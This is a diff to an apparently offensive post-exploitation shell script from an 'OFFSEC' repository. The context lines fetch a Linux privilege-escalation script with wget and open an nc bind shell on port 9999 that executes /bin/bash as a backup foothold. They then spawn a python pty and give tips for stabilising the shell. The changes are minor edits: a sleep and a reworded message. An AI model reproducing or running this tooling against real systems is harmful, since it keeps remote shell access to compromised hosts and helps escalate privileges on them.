@@ -27,6 +27,8 @@ wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxpriv
 # build a NC bind shell incase we lose a shell
 echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
 $stage/nc -nlvp 9999 -e /bin/bash &
+# chill for a szecond
+sleep 2
 
 # semi interactive shell
 echo "[*] Attempting to build semi-interactive shell "
@@ -39,9 +41,9 @@ elif command -v python3 &>/dev/null; then
     python3 -c 'import pty;pty.spawn("/bin/bash");' 
     
 else
-    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method (may or may not work)"
-    #echo os.system('/bin/bash')
+    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method"
 fi
+
 echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"
 
 
